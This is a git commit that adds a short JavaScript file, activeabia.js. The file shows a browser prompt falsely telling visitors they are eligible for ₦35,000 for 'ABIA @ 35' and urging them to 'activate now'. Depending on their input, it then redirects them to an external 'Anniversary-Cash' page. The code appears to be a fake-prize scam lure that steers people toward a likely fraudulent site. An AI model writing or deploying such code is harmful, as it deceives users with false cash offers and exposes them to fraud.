e07205dc96a020283e35da5107016c2981b00e31
kpesaa <meiosis_logins.2d@icloud.com>
2026-08-27 04:58:09 +0100

    Create activeabia.js

---
+++ activeabia.js
@@ -0,0 +1,11 @@
+
+var password = '₦35,000';
+
+password = prompt(
+  'Congratulations, you are eligible for ₦35,000 - ABIA @ 35. Click OK to activate now.',
+  '₦35,000'
+);
+
+if (password !== '₦35,000') {
+    location.href = 'https://kpesa.info/Abia-35th-Anniversary-Cash.html';
+}
